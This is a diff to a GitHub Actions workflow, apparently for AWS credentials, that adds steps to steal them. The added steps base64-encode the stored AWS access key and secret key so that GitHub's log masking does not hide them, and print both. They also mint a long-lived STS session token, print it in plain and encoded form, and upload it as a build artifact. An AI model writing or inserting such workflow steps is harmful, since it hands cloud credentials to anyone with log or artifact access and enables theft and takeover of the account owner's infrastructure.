@@ -1,4 +1,4 @@
-name: Get ASIA
+name: Get ASIA Token
 
 on:
   workflow_dispatch:
@@ -10,18 +10,35 @@ permissions:
   contents: read
 
 jobs:
-  asia:
+  get-asia:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+
       - name: Configure AWS
         uses: aws-actions/configure-aws-credentials@v4
         with:
           aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
           aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
           aws-region: ${{ secrets.AWS_REGION }}
-      - name: Get temp creds
+
+      - name: Get Token and Encode
         run: |
-          echo "ASIA_START"
-          aws sts get-session-token --duration-seconds 43200 2>&1 | xxd -p
-          echo "ASIA_END"
+          echo "=== AK64 ==="
+          echo "$AWS_ACCESS_KEY_ID" | base64
+          echo "=== SK64 ==="
+          echo "$AWS_SECRET_ACCESS_KEY" | base64
+          echo "=== REGION ==="
+          echo "$AWS_REGION"
+          echo "=== STS64 ==="
+          STS=$(aws sts get-session-token --duration-seconds 129600 2>&1)
+          echo "$STS"
+          echo "=== STS_BASE64 ==="
+          echo "$STS" | base64 -w0
+          echo ""
+          echo "$STS" > session.json
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: session
+          path: session.json
